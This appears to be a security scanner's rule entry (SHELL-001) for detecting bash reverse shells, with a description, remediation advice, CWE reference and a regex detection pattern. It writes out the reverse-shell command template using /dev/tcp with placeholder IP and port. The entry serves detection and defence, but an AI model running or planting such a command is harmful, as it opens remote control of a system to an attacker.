
======================================================================
SHELL-001 Bash reverse shell [CRITICAL]
======================================================================

Category:
  Malicious Code  (detector: rules)

Description:
  Pattern indicates a bash reverse shell connection

Recommendation:
  Remove reverse shell code immediately

CWE: CWE-506

Technical Details:
  Bash's /dev/tcp is a pseudo-device that creates TCP connections.
  Pattern: bash -i >& /dev/tcp/IP/PORT 0>&1 redirects
  stdin/stdout/stderr to the attacker's listener.

Detection Patterns:
  - /dev/tcp/\d+\.\d+\.\d+\.\d+/\d+

Related Codes:
  SHELL-002, SHELL-003, SHELL-004

======================================================================
